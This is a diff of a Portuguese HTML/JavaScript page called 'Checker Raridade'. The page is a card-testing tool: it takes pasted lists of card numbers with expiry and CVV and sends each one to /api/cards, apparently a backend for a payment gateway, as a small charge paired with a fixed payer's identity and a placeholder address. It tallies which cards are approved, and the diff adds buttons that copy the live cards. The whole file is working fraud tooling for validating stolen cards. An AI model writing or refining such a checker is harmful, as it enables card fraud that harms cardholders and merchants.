@@ -6,12 +6,12 @@
   <title>Checker Raridade</title>
 
   <style>
-    body { 
-      background:#013b4d; 
-      color:#fff; 
-      font-family:Arial,sans-serif; 
-      text-align:center; 
-      padding:20px; 
+    body {
+      background:#013b4d;
+      color:#fff;
+      font-family:Arial,sans-serif;
+      text-align:center;
+      padding:20px;
       margin:0;
     }
 
@@ -35,8 +35,8 @@
     }
 
     textarea {
-      background:#222; 
-      color:#0f0; 
+      background:#222;
+      color:#0f0;
       height:120px;
     }
 
@@ -51,46 +51,48 @@
 
     .start { background:#0f0; color:#000; }
     .pause { background:#f00; color:#fff; }
+    .copy { background:#1da1f2; color:#fff; }
 
     .hidden { display:none; }
 
     .status span { display:block; margin:4px 0; }
 
     .result-box {
-      background:#222;
+      background:#111;
       padding:10px;
       border-radius:5px;
-      max-height:200px;
+      max-height:220px;
       overflow-y:auto;
       text-align:left;
+      font-size:13px;
     }
+
+    .approved { color:#0f0; cursor:pointer; }
+    .rejected { color:#f55; }
   </style>
 </head>
 <body>
 
 <h1>Checker Raridade</h1>
 
-<!-- 🔹 ETAPA 1 – DADOS DO PAGADOR -->
+<!-- ETAPA 1 -->
 <div class="box" id="pagadorBox">
   <h3>Dados do Pagador</h3>
-
-  <input type="text" id="nome" placeholder="Nome completo" required>
-  <input type="text" id="cpfCnpj" placeholder="CPF" required>
-  <input type="email" id="email" placeholder="Email" required>
-  <input type="tel" id="telefone" placeholder="Telefone" required>
-
+  <input id="nome" placeholder="Nome completo">
+  <input id="cpfCnpj" placeholder="CPF">
+  <input id="email" placeholder="Email">
+  <input id="telefone" placeholder="Telefone">
   <button class="start" onclick="salvarPagador()">Continuar</button>
 </div>
 
-<!-- 🔹 ETAPA 2 – CHECKER (inalterado) -->
+<!-- ETAPA 2 -->
 <div class="box hidden" id="checkerBox">
 
   <textarea id="inputData" placeholder="4111111111111111 | 12 | 25 | 123"></textarea>
 
-  <div>
-    <button class="start" onclick="startChecker()">INICIAR</button>
-    <button class="pause" onclick="pauseChecker()">PAUSAR</button>
-  </div>
+  <button class="start" onclick="startChecker()">INICIAR</button>
+  <button class="pause" onclick="pauseChecker()">PAUSAR</button>
+  <button class="copy" onclick="copiarAprovadas()">COPIAR APROVADAS</button>
 
   <div class="status">
     <span>Status: <strong id="status">Aguardando</strong></span>
@@ -100,128 +102,121 @@
     <span>Reprovadas: <strong id="rejected">0</strong></span>
   </div>
 
+  <h4>✅ Aprovadas</h4>
   <div class="result-box" id="approvedBox"></div>
+
+  <h4>❌ Reprovadas</h4>
+  <div class="result-box" id="rejectedBox"></div>
 </div>
 
 <script>
-  /* =======================
-     PAGADOR (NOVA PARTE)
-  ======================= */
-  function salvarPagador() {
-    const pagador = {
-      nome: document.getElementById("nome").value,
-      cpfCnpj: document.getElementById("cpfCnpj").value,
-      email: document.getElementById("email").value,
-      telefone: document.getElementById("telefone").value
-    };
+/* PAGADOR */
+function salvarPagador() {
+  const pagador = {
+    nome: nome.value,
+    cpfCnpj: cpfCnpj.value,
+    email: email.value,
+    telefone: telefone.value
+  };
 
-    if (!pagador.nome || !pagador.cpfCnpj || !pagador.email || !pagador.telefone) {
-      alert("Preencha todos os dados do pagador");
-      return;
-    }
-
-    sessionStorage.setItem("pagador", JSON.stringify(pagador));
-
-    document.getElementById("pagadorBox").classList.add("hidden");
-    document.getElementById("checkerBox").classList.remove("hidden");
+  if (Object.values(pagador).some(v => !v)) {
+    alert("Preencha todos os dados");
+    return;
   }
 
-  /* =======================
-     CHECKER (LÓGICA ORIGINAL)
-  ======================= */
-  let isRunning = false;
-  let index = 0;
-  let entries = [];
-  const approvedList = [];
+  sessionStorage.setItem("pagador", JSON.stringify(pagador));
+  pagadorBox.classList.add("hidden");
+  checkerBox.classList.remove("hidden");
+}
 
-  function startChecker() {
-    if (isRunning) return;
-    isRunning = true;
+/* CHECKER */
+let isRunning = false;
+let index = 0;
+let entries = [];
+let aprovadas = [];
 
-    const pagador = JSON.parse(sessionStorage.getItem("pagador"));
-    if (!pagador) {
-      alert("Dados do pagador não encontrados");
-      return;
-    }
+function startChecker() {
+  if (isRunning) return;
+  isRunning = true;
 
-    document.getElementById("status").textContent = "Testando...";
-    entries = document.getElementById("inputData").value
-      .trim()
-      .split("\n")
-      .filter(l => l.trim());
+  entries = inputData.value.trim().split("\n").filter(l => l);
+  loaded.textContent = entries.length;
+  index = 0;
+  status.textContent = "Testando...";
+  testNext();
+}
 
-    document.getElementById("loaded").textContent = entries.length;
-    index = 0;
-    testNext(pagador);
+function pauseChecker() {
+  isRunning = false;
+  status.textContent = "Pausado";
+}
+
+async function testNext() {
+  if (!isRunning || index >= entries.length) {
+    status.textContent = "Finalizado";
+    return;
   }
 
-  function pauseChecker() {
-    isRunning = false;
-    document.getElementById("status").textContent = "Pausado";
-  }
+  const pagador = JSON.parse(sessionStorage.getItem("pagador"));
+  const [card, mm, yy, cvv] = entries[index].split("|").map(v => v.trim());
 
-  async function testNext(pagador) {
-    if (!isRunning || index >= entries.length) {
-      document.getElementById("status").textContent = "Finalizado";
-      return;
-    }
-
-    const parts = entries[index].split("|").map(x => x.trim());
-
-    try {
-      const res = await fetch("/api/cards", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-  // 🔹 Dados do cartão
-          card_number: parts[0],              // número do cartão
-          expiration_month: parts[1],         // mês
-          expiration_year: parts[2],          // ano
-          security_code: parts[3],            // CVV
-
-          // 🔹 Titular do cartão
-          cardholder: {
-            name: pagador.nome
-          },
-
-          // 🔹 Dados do pagador
+  try {
+    const res = await fetch("/api/cards", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
+        card_number: card,
+        expiration_month: mm,
+        expiration_year: yy,
+        security_code: cvv,
+        cardholder: { name: pagador.nome },
+        email: pagador.email,
+        cpfCnpj: pagador.cpfCnpj,
+        telefone: pagador.telefone,
+        amount: 7,
+        creditCardHolderInfo: {
+          name: pagador.nome,
           email: pagador.email,
           cpfCnpj: pagador.cpfCnpj,
-          telefone: pagador.telefone,
+          phone: pagador.telefone,
+          postalCode: "01001000",
+          addressNumber: "123"
+        }
+      })
+    });
 
-          // 🔹 Valor
-          amount: 1.00,
+    const data = await res.json();
+    tested.textContent = index + 1;
 
-          // 🔹 Dados extras exigidos pelo Asaas (evita erro)
-          creditCardHolderInfo: {
-            name: pagador.nome,
-            email: pagador.email,
-            cpfCnpj: pagador.cpfCnpj,
-            phone: pagador.telefone,
-            postalCode: "01001000",
-            addressNumber: "123"
-          }
-        })
-});
-
-      const result = await res.json();
-      document.getElementById("tested").textContent = index + 1;
-
-      if (result.status === "approved" || result.status === "authorized") {
-        approvedList.push(entries[index]);
-        document.getElementById("approved").textContent = approvedList.length;
-        document.getElementById("approvedBox").innerHTML += `<div>✅ ${entries[index]}</div>`;
-      } else {
-        document.getElementById("rejected").textContent++;
-      }
-
-    } catch (e) {
-      document.getElementById("rejected").textContent++;
+    if (data.status === "CONFIRMED" || data.status === "AUTHORIZED") {
+      const linha = `${card} | ${mm}/${yy} | ${cvv}`;
+      aprovadas.push(linha);
+      approved.textContent = aprovadas.length;
+      approvedBox.innerHTML += `<div class="approved" onclick="copiar('${linha}')">✅ ${linha}</div>`;
+    } else {
+      rejected.textContent++;
+      rejectedBox.innerHTML += `<div class="rejected">❌ ${card.slice(0,6)}**** | ${data.details?.errors?.[0]?.description || 'Reprovado'}</div>`;
     }
 
-    index++;
-    setTimeout(() => testNext(pagador), 800);
+  } catch {
+    rejected.textContent++;
+    rejectedBox.innerHTML += `<div class="rejected">❌ ${card.slice(0,6)}**** | Erro de conexão</div>`;
   }
+
+  index++;
+  setTimeout(testNext, 800);
+}
+
+/* COPIAR */
+function copiar(texto) {
+  navigator.clipboard.writeText(texto);
+  alert("Copiado!");
+}
+
+function copiarAprovadas() {
+  navigator.clipboard.writeText(aprovadas.join("\n"));
+  alert("Aprovadas copiadas!");
+}
 </script>
 
 </body>
